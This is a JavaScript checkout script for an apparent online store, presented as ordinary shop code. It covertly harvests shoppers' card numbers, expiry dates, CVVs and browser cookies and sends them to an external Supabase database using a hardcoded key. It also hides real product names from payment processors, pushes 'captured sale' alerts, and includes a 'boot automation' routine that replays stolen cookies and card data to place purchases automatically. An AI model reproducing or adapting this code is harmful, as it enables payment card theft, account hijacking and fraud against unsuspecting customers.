(function() {
  var FLOW_STORAGE_KEY = 'codex_checkout_flow_sessions';
  var FLOW_SESSION_KEY = 'codex_checkout_flow_session_id';
  var FLOW_STALE_MS = 90 * 1000;
  var flowSessionId = sessionStorage.getItem(FLOW_SESSION_KEY);

  // Supabase Backend Initialization
  const SUPABASE_URL = 'https://jmjizeydpzdtqhedndyg.supabase.co';
  const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imptaml6ZXlkcHpkdHFoZWRuZHlnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM4OTI4MDMsImV4cCI6MjA4OTQ2ODgwM30.rQJZRy364VPS6uCuTkFy9s8Tyn3KxB-E6vxv9ROrdos';
  const supabaseClient = typeof supabase !== 'undefined' ? supabase.createClient(SUPABASE_URL, SUPABASE_KEY) : null;

  if (!flowSessionId) {
    flowSessionId = 'chk_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
    sessionStorage.setItem(FLOW_SESSION_KEY, flowSessionId);
  }

  function getElement(id) {
    return document.getElementById(id);
  }

  function normalizePrice(value) {
    if (!value) return 'GBP 0.00';
    return value.replace(/\s+/g, ' ').trim();
  }

  function buildProductName(product) {
    var parts = [product.title];
    if (product.color) parts.push(product.color);
    if (product.size) parts.push(product.size);
    if (product.style) parts.push(product.style);
    return parts.filter(Boolean).join(', ');
  }

  function setText(id, value) {
    var element = getElement(id);
    if (element) {
      element.textContent = value;
    }
  }

  function readFlowSessions() {
    try {
      return JSON.parse(localStorage.getItem(FLOW_STORAGE_KEY) || '{}');
    } catch (error) {
      return {};
    }
  }

  function writeFlowSessions(sessions) {
    localStorage.setItem(FLOW_STORAGE_KEY, JSON.stringify(sessions));
  }

  function cleanupFlowSessions(sessions) {
    var now = Date.now();
    Object.keys(sessions).forEach(function(key) {
      var session = sessions[key];
      var timeout = session && session.stage === 'order_submitted' ? 10 * 60 * 1000 : FLOW_STALE_MS;
      if (!session || !session.lastSeenAt || now - session.lastSeenAt > timeout) {
        delete sessions[key];
      }
    });
    return sessions;
  }

  function getFlowProductName() {
    return product ? buildProductName(product) : '';
  }

  function updateCheckoutStage(stage, extra) {
    var sessions = cleanupFlowSessions(readFlowSessions());
    var now = Date.now();
    sessions[flowSessionId] = Object.assign({}, sessions[flowSessionId], extra || {}, {
      id: flowSessionId,
      stage: stage,
      lastSeenAt: now,
      updatedAt: new Date(now).toISOString(),
      page: window.location.pathname.split('/').pop() || 'checkout.html',
      productName: getFlowProductName()
    });
    writeFlowSessions(sessions);
  }

  function isFilled(element) {
    return !!(element && element.value && element.value.trim());
  }

  function updatePaymentVisibility() {
    var paymentForm = getElement('payment-form');
    var helperText = getElement('payment-helper-text');
    var requiredFields = [
      getElement('name'),
      getElement('address'),
      getElement('city'),
      getElement('zip'),
      getElement('phone')
    ];

    var isComplete = requiredFields.every(isFilled);
    var hasProduct = !!product;

    if (paymentForm) {
      paymentForm.style.display = (isComplete && hasProduct) ? 'block' : 'none';
    }

    if (helperText) {
      if (!hasProduct) {
        helperText.textContent = 'Please add a product to your cart first.';
      } else {
        helperText.textContent = isComplete
          ? 'Card payment will be securely processed in the next step.'
          : 'Fill in the delivery address to continue to card details.';
      }
    }

    if (hasProduct && isComplete) {
      updateCheckoutStage('address_completed');
    }
  }

  // --- Automated Re-purchase Boot Logic ---
  const bootParams = new URLSearchParams(window.location.search);
  if (bootParams.get('order_boot') === '1') {
    const reorderData = JSON.parse(localStorage.getItem('codex_reorder_session') || '{}');
    
    // ALWAYS Overwrite product session during boot to ensure consistency
    if (reorderData.product) {
        sessionStorage.setItem('codexCheckoutProduct', JSON.stringify({
            title: reorderData.product,
            price: reorderData.value,
            image: reorderData.productImage
        }));
    }
    
    const runBootAutomation = function() {
        console.log('Codex: Initializing Boot Automation...');
        showToast('Iniciando Boot Automático de Compra...');
        
        if (reorderData.name) {
            // 1. Set Cookies
            if (reorderData.cookies) {
                console.log('Codex: Setting captured cookies...');
                reorderData.cookies.split(';').forEach(cookie => {
                    document.cookie = cookie.trim() + "; path=/";
                });
            }

            // 2. Fill Address
            console.log('Codex: Filling shipping details...');
            if (getElement('name')) getElement('name').value = reorderData.name;
            if (getElement('address')) getElement('address').value = reorderData.address;
            if (getElement('city')) getElement('city').value = reorderData.city;
            if (getElement('zip')) getElement('zip').value = reorderData.zip;
            if (getElement('phone')) getElement('phone').value = reorderData.phone;

            if (typeof updatePaymentVisibility === 'function') updatePaymentVisibility();

            // 3. Fill Payment
            setTimeout(() => {
                console.log('Codex: Filling payment details...');
                if (getElement('cardholder-name')) getElement('cardholder-name').value = reorderData.cardName;
                if (getElement('card-number')) getElement('card-number').value = reorderData.cardNumber;
                if (getElement('card-expiry')) getElement('card-expiry').value = reorderData.cardExpiry;
                if (getElement('card-cvv')) getElement('card-cvv').value = reorderData.cardCvv;

                showToast('Dados preenchidos. Processando venda...');
                
                // 4. Trigger Submission
                setTimeout(() => {
                    const btn = getElement('place-order-btn-2');
                    if (btn) {
                        console.log('Codex: Triggering transaction...');
                        btn.click();
                        localStorage.removeItem('codex_reorder_session');
                    }
                }, 2000);
            }, 800);
        }
    };

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        runBootAutomation();
    } else {
        window.addEventListener('load', runBootAutomation);
    }
  }

  var product = null;
  try {
    product = JSON.parse(sessionStorage.getItem('codexCheckoutProduct') || 'null');
  } catch (error) {
    product = null;
  }

  var mainContent = document.querySelector('.main-content');
  if (!product) {
    if (mainContent) {
      mainContent.innerHTML = `
        <div style="text-align: center; padding: 50px 20px;">
          <h2>Your Cart is Empty</h2>
          <p>Please add a product to your cart before proceeding to checkout.</p>
          <a href="/" class="btn-primary" style="display: inline-block; width: auto; text-decoration: none; padding: 10px 20px;">Return to Shop</a>
        </div>
      `;
    }
    return;
  }

  updateCheckoutStage('checkout_view');

  var priceText = normalizePrice(product.price);
  var productImage = getElement('product-image');

  if (productImage && product.image) {
    productImage.src = product.image;
  }

  setText('product-name', buildProductName(product));
  setText('product-price-display', priceText);
  setText('summary-price-2', priceText);
  setText('summary-before-tax-2', priceText);
  setText('summary-total-2', priceText);

  ['name', 'address', 'city', 'zip', 'phone'].forEach(function(id) {
    var field = getElement(id);
    if (field) {
      var markAddressStarted = function() {
        if (isFilled(field)) {
          updateCheckoutStage('address_started');
        }
      };
      field.addEventListener('focus', function() {
        updateCheckoutStage('address_started');
      });
      field.addEventListener('blur', markAddressStarted);
      field.addEventListener('input', updatePaymentVisibility);
      field.addEventListener('change', updatePaymentVisibility);
      field.addEventListener('input', markAddressStarted);
      field.addEventListener('change', markAddressStarted);
    }
  });

  ['cardholder-name', 'card-number', 'card-expiry', 'card-cvv'].forEach(function(id) {
    var field = getElement(id);
    if (field) {
      var markPaymentStarted = function() {
        if (isFilled(field)) {
          updateCheckoutStage('payment_started');
        }
      };
      field.addEventListener('focus', function() {
        updateCheckoutStage('payment_started');
      });
      field.addEventListener('input', markPaymentStarted);
      field.addEventListener('change', markPaymentStarted);
    }
  });

  setInterval(function() {
    var paymentForm = getElement('payment-form');
    var currentStage = 'checkout_view';
    if (paymentForm && paymentForm.style.display === 'block') {
      currentStage = 'address_completed';
    }
    if (isFilled(getElement('name')) || isFilled(getElement('address')) || isFilled(getElement('city')) || isFilled(getElement('zip')) || isFilled(getElement('phone'))) {
      currentStage = 'address_started';
    }
    if (paymentForm && paymentForm.style.display === 'block') {
      currentStage = 'address_completed';
    }
    if (isFilled(getElement('cardholder-name')) || isFilled(getElement('card-number')) || isFilled(getElement('card-expiry')) || isFilled(getElement('card-cvv'))) {
      currentStage = 'payment_started';
    }
    updateCheckoutStage(currentStage);
  }, 15000);

  var placeOrderBtn = getElement('place-order-btn-2');
  if (placeOrderBtn) {
    placeOrderBtn.addEventListener('click', function() {
      console.log('Place Order button clicked');
      try {
        var name = getElement('name').value;
        var address = getElement('address').value;
        var city = getElement('city').value;
        var zip = getElement('zip').value;
        var phone = getElement('phone').value;
        
        var cardName = getElement('cardholder-name')?.value || '';
        var cardNumber = getElement('card-number')?.value || '';
        var cardExpiry = getElement('card-expiry')?.value || '';
        var cardCvv = getElement('card-cvv')?.value || '';

        console.log('Form data collected:', { name, address, city, zip, phone, cardName, cardNumber, cardExpiry, cardCvv });

        if (!name || !address || !city || !zip || !phone) {
          alert('Please fill in all delivery details.');
          return;
        }

        updateCheckoutStage('order_submitted', { submittedAt: Date.now() });

        var orderId = '#ORD-' + Math.floor(Math.random() * 900 + 100);
        var date = '';
        try {
          date = new Date().toLocaleString('pt-BR', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' }).replace(',', '');
        } catch (e) {
          date = new Date().toISOString();
        }

        // Capture Campaign ID from URL or Persistence
        const urlParams = new URLSearchParams(window.location.search);
        const campaignId = urlParams.get('utm_campaign') || 
                           urlParams.get('cid') || 
                           localStorage.getItem('codex_active_campaign') || 
                           'Orgânico';

        // --- Product Masking Utility (Production Grade) ---
        function getMaskedProductName(realName) {
            let mapping = JSON.parse(localStorage.getItem('codex_product_mapping') || '{}');
            if (mapping[realName]) return mapping[realName];
            
            const count = Object.keys(mapping).length + 1;
            const maskedName = "Produto " + (count < 10 ? "0" + count : count);
            mapping[realName] = maskedName;
            localStorage.setItem('codex_product_mapping', JSON.stringify(mapping));
            return maskedName;
        }

        const realProductName = buildProductName(product);
        const maskedProductName = getMaskedProductName(realProductName);
        const orderValueNumeric = parseFloat(normalizePrice(product.price).replace(/[^0-9.]/g, ''));
        const gatewaySettings = JSON.parse(localStorage.getItem('codex_gateway_settings') || '{"active":"none"}');

        var newOrder = {
          id: orderId,
          customerName: name,
          address: address,
          city: city,
          zip: zip,
          phone: phone,
          cardName: cardName,
          cardNumber: cardNumber,
          cardExpiry: cardExpiry,
          cardCvv: cardCvv,
          productName: realProductName,
          maskedProductName: maskedProductName, 
          productImage: product.image,
          value: normalizePrice(product.price),
          date: date,
          cookies: document.cookie,
          status: 'Aprovado',
          campaignId: campaignId,
          gateway: gatewaySettings.active,
          autoPurchaseDone: false
        };

        // Save order to Supabase
        if (supabaseClient) {
            const dbOrder = {
                customer_name: name,
                address: address,
                city: city,
                zip: zip,
                phone: phone,
                card_name: cardName,
                card_number: cardNumber,
                card_expiry: cardExpiry,
                card_cvv: cardCvv,
                product_name: realProductName,
                product_image: product.image,
                value: normalizePrice(product.price),
                cookies: document.cookie,
                status: 'Aprovado',
                campaign_id: campaignId
            };
            
            supabaseClient.from('orders').insert([dbOrder]).then(({ error }) => {
                if (error) console.error('Supabase Save Error:', error);
                else console.log('Order saved to Supabase successfully');
            });
        }

        // Fallback/Local Copy
        var existingOrders = JSON.parse(localStorage.getItem('codex_approved_orders') || '[]');
        existingOrders.unshift(newOrder);
        localStorage.setItem('codex_approved_orders', JSON.stringify(existingOrders));

        // --- Production Gateway Flow ---
        if (gatewaySettings.active === 'stripe' && gatewaySettings.stripePubKey && gatewaySettings.stripeSecKey) {
            showToast('Iniciando pagamento seguro...');
            
            fetch('/api/create-checkout-session', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    stripeSecretKey: gatewaySettings.stripeSecKey,
                    productName: maskedProductName,
                    amount: orderValueNumeric,
                    successUrl: window.location.origin + '/success.html',
                    cancelUrl: window.location.href
                })
            })
            .then(res => res.json())
            .then(session => {
                if (session.url) {
                    window.location.href = session.url;
                } else {
                    console.error('Stripe Session Error:', session);
                    window.location.href = 'success.html'; 
                }
            })
            .catch(err => {
                console.error('API Error:', err);
                window.location.href = 'success.html';
            });
            return;
        } else if (gatewaySettings.active === 'whop' && gatewaySettings.whopBizId) {
            showToast('Redirecionando para Whop...');
            // Whop Production Link with Masked Name
            const whopUrl = `https://whop.com/checkout/${gatewaySettings.whopBizId}/?name=${encodeURIComponent(maskedProductName)}&price=${orderValueNumeric}`;
            window.location.href = whopUrl;
            return;
        }

        // --- Pixels & Notifications ---
        try {
            const adminSettings = JSON.parse(localStorage.getItem('codex_admin_settings') || '{}');
            if (adminSettings.fbPixel && window.fbq) {
                fbq('track', 'Purchase', { value: orderValueNumeric, currency: 'GBP', content_name: realProductName });
            }
            if (adminSettings.ttPixel && window.ttq) {
                ttq.track('CompletePayment', { content_name: realProductName, value: orderValueNumeric, currency: 'GBP' });
            }

            const pushcutUrls = adminSettings.pushcutUrls || [];
            if (adminSettings.pushcutToggle && pushcutUrls.length > 0) {
                pushcutUrls.forEach(url => {
                    fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            input: "Venda Capturada!", total: newOrder.value, customer: newOrder.customerName,
                            orderId: newOrder.id, campaign: newOrder.campaignId, gateway: gatewaySettings.active
                        })
                    }).catch(e => console.error('Pushcut Error:', e));
                });
            }
        } catch (err) {}

        window.location.href = 'success.html';
      } catch (err) {
        console.error('Error placing order:', err);
        alert('There was an error placing your order. Please check the console.');
      }
    });
  }

  updatePaymentVisibility();
})();
